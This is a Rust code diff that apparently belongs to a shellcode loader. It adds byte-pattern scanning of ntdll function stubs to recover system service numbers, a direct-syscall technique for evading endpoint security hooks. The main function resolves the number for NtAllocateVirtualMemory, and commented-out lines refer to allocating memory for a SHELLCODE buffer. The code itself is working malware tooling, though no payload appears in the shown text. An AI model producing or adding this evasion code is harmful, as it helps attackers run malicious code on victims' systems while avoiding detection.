@@ -184,6 +184,34 @@ fn get_ssn(func_name: &str) -> u32 {
                         "[+] Found function: {} at {:p}",
                         function_str, function_addr
                     );
+
+                    let mut byte = 0;
+                    loop {
+                        let bytes = function_addr as *const u8;
+                        if *bytes.offset(byte) == 0x0f && *bytes.offset(byte + 1) == 0x05 {
+                            return 0;
+                        }
+
+                        if *bytes.offset(byte) == 0xc3 {
+                            return 0;
+                        }
+
+                        if *bytes.offset(byte) == 0x4c
+                            && *bytes.offset(byte + 1) == 0x8b
+                            && *bytes.offset(byte + 2) == 0xd1
+                            && *bytes.offset(byte + 3) == 0xb8
+                            && *bytes.offset(byte + 6) == 0x00
+                            && *bytes.offset(byte + 7) == 0x00
+                        {
+                            let low = *bytes.offset(byte + 4) as u32;
+                            let high = *bytes.offset(byte + 5) as u32;
+                            let ssn = (high << 8) | low;
+
+                            return ssn;
+                        }
+
+                        byte += 1;
+                    }
                 }
             }
         }
@@ -194,6 +222,7 @@ fn get_ssn(func_name: &str) -> u32 {
 fn main() {
     unsafe {
         let ssn = get_ssn("NtAllocateVirtualMemory");
+        println!("[+] NtAllocateVirtualMemory SSN: 0x{:X}", ssn);
 
         // let mut base_address: *mut _ = null_mut();
         // let mut size = SHELLCODE.len();
